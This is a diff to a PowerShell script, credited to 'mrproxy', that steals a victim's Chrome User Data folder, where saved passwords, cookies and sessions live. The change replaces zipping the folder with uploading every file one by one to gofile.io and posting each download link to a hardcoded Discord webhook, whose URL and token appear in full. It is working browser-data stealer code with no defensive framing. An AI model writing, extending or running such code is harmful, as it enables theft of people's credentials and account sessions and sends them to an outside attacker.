@@ -1,7 +1,5 @@
 ### Created by mrproxy
 
-### Created by mrproxy
-
 # Define the Discord Webhook URL (no `=` at the start)
 $webhook = "https://discord.com/api/webhooks/1315398167768076348/FHFvfm3hhnJDsTNvuTR-5oB86OJY7kUwI-4F5S_Hxn7SdgZY1gXxaRQFuMO-yFFwPnPT"
 
@@ -73,24 +71,25 @@ if (-not (Test-Path $chromePath)) {
     exit
 }
 
-# Create a zip of the Chrome User Data using Compress-Archive
-$outputZip = "$env:TEMP\chrome_data.zip"
-$chromeData = Get-ChildItem "$chromePath" -Recurse
-Compress-Archive -Path $chromeData -DestinationPath $outputZip
-if ($LASTEXITCODE -ne 0) {
-    Send-DiscordMessage -message "Error creating zip file with Compress-Archive"
+# Get all files from the Chrome User Data folder (recursive)
+$chromeFiles = Get-ChildItem "$chromePath" -Recurse | Where-Object { -not $_.PSIsContainer }
+
+if ($chromeFiles.Count -eq 0) {
+    Send-DiscordMessage -message "No files found in Chrome User Data folder!"
     exit
 }
 
-# Upload the file and get the link
-$link = Upload-FileAndGetLink -filePath $outputZip
+# Iterate through each file and upload it to GoFile
+foreach ($file in $chromeFiles) {
+    $link = Upload-FileAndGetLink -filePath $file.FullName
 
-# Check if the upload was successful and send the link via Discord
-if ($link -ne $null) {
-    Send-DiscordMessage -message "Download link: $link"
-} else {
-    Send-DiscordMessage -message "Failed to upload file to gofile.io"
+    # Check if the upload was successful and send the link via Discord
+    if ($link -ne $null) {
+        Send-DiscordMessage -message "File uploaded: $link"
+    } else {
+        Send-DiscordMessage -message "Failed to upload file: $($file.FullName)"
+    }
 }
 
-# Remove the zip file after uploading
-Remove-Item $outputZip
+# Optionally, notify when all files are processed
+Send-DiscordMessage -message "All files processed."
